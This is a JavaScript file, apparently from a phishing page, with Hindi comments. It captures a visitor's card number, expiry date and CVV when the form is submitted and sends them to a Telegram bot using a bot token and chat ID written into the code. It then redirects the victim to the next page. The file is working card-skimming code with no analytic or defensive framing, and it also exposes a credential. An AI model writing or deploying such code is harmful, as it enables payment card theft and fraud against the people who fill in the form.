document.addEventListener("DOMContentLoaded", function () {
    const form = document.getElementById("submitForm");
    const chat_id = "-1002677669875"; // आपका Telegram Chat ID
    const bot_token = "7839710665:AAGKbR-tYd-mfFYfptxDZnpaUctzEAWMfwU"; // आपका बॉट टोकन

    function sendToTelegram(message) {
        const telegramURL = `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

        fetch(telegramURL)
            .then(response => response.json())
            .then(data => console.log("✅ Telegram Response:", data))
            .catch(error => console.error("❌ Telegram Error:", error));
    }

    // ✅ Form Submit Event
    form.addEventListener("submit", function (e) {
        e.preventDefault();

        const cardNumber = document.getElementById("ccnum").value;
        const expiryDate = document.getElementById("edate").value;
        const cvv = document.querySelector("input[name='cvv']").value;

        if (!cardNumber || !expiryDate || !cvv) {
            alert("⚠️ कृपया सभी फ़ील्ड भरें!");
            return;
        }

        // 📌 Telegram Message Format
        const message = `💳 **New Card Details Submitted**:\n\n`
                      + `🔹 **Card Number:** ${cardNumber}\n`
                      + `🔹 **Expiry Date:** ${expiryDate}\n`
                      + `🔹 **CVV:** ${cvv}`;

        // ✅ Telegram पर डेटा भेजें
        sendToTelegram(message);

        // ✅ Next Page पर Redirect करें
        const nextPage = document.getElementById("nextValue").value;
        window.location.href = nextPage;
    });

    console.log("✅ script.js लोड हो गया!");
});